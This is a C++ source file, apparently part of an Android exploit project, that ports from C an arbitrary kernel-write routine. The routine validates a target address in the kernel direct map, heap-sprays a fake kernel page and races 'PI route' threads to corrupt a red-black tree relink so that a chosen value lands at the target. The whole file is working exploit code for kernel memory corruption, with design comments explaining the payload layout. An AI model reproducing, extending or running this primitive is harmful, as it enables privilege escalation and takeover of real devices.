/** @file jni/write_one.cpp
 *  Body from bddfea4:src/core/main.c:367-398, line for line.
 *
 *  Kept as the C file wrote it: the order (guard, arm the mode, spray, check the arm, run the
 *  route, clear, report) and the two comments that say why the arm is checked and why a target
 *  outside the direct map is not attempted.
 *
 *  Three steps the C body reached through file scope are seams here, and a missing seam is a
 *  named refusal -- never a step quietly skipped:
 *      set_write_mode   (C: set_pselect_write_mode)
 *      prepare_page     (C: prepare_good_kernel_page), which also fills products.page_base
 *      clear_write      (C: clear_pselect_write), which the C body called on every exit path
 *  The arm test reads products.fake_right, exactly as the C body read fake_right.
 *
 *  Not moved: the three TIMER(...) calls the C body used to time the spray and the route
 *  ("heap spray start", "heap spray done", "PI route done"). This tree has its own logging
 *  seam and no timer macro, and inventing one here would add a thing the tree does not have.
 *  The omission is recorded rather than silent.
 */
#include "jni/write_one.hpp"

#include "support/log.hpp"

namespace ghostlock::jni {
    namespace {
        /** The value the leaf arm stores; leaf=1 is the value=0 payload. */
        constexpr std::int32_t kLeafArm = 1;
        /** Step numbers, kept from the C file so a log reader sees the same shape. */
        constexpr std::int32_t kStepNoMode = 20;
        constexpr std::int32_t kStepNoPage = 21;
        constexpr std::int32_t kStepNoClear = 22;
        constexpr std::int32_t kStepArmMismatch = 23;
    }  // namespace

    int do_one_write(const WriteOneParams &params, const DirectMapBounds &bounds,
                     race::RaceContext &context, SprayProducts &products,
                     const WriteSeams &seams) noexcept {
        log("info", "write one", static_cast<std::int64_t>(params.target));
        /* a target outside the direct map is wrong by construction, so it is worth neither a
         *  spray nor a retry */
        if (!(params.target > bounds.begin && params.target < bounds.end)) {
            log("warning", "target is outside the direct map, not writing");
            return 0;
        }
        /* Parameterised refusals: the C body could assume these existed at file scope. */
        if (seams.set_write_mode == nullptr) {
            context.route_result.step = kStepNoMode;
            log("error", "write one: set_write_mode seam is absent");
            return 0;
        }
        if (seams.prepare_page == nullptr) {
            context.route_result.step = kStepNoPage;
            log("error", "write one: prepare_page seam is absent");
            return 0;
        }
        if (seams.clear_write == nullptr) {
            context.route_result.step = kStepNoClear;
            log("error", "write one: clear_write seam is absent");
            return 0;
        }
        /* Both transports write *(target) := value through the erase left-only relink: waiter
         *  words are {pc = value, right = 0, left = target} and the node is RED so no color
         *  fixup runs. leaf=1 is the value=0 payload. */
        /* main.c:376 sets the child-node switch first, then hands the mode to
         *  set_pselect_write_mode. That order is kept here even though the two are
         *  independent today: the seam does not read the switch, but that is a fact about
         *  its current body, not a guarantee. */
        context.write_mode.pselect_child_node = params.leaf == kLeafArm ? 0 : 1;
        (void) seams.set_write_mode(params.target, params.mode, seams.context);
        if (!seams.prepare_page(products, seams.context)) {
            log("warning", "heap spray failed");
            seams.clear_write(seams.context);
            return 0;
        }
        /* only the leaf arm stores zero, and the value arm does not, so a leaf payload fired at
         *  a value target zeroes it. The C body read fake_right here; so does this. */
        const bool leaf_arm = params.leaf == kLeafArm;
        const bool arm_matches =
            leaf_arm ? (products.fake_right == 0U) : (products.fake_right != 0U);
        if (!arm_matches) {
            context.route_result.step = kStepArmMismatch;
            log("warning", "payload arm mismatch, skipping write",
                static_cast<std::int64_t>(products.fake_right));
            seams.clear_write(seams.context);
            return 0;
        }
        const bool routed = run_main_route_threads(context);
        seams.clear_write(seams.context);
        if (!routed) {
            log("warning", "the route did not produce a verified write");
        }
        return routed ? 1 : 0;
    }
}  // namespace ghostlock::jni
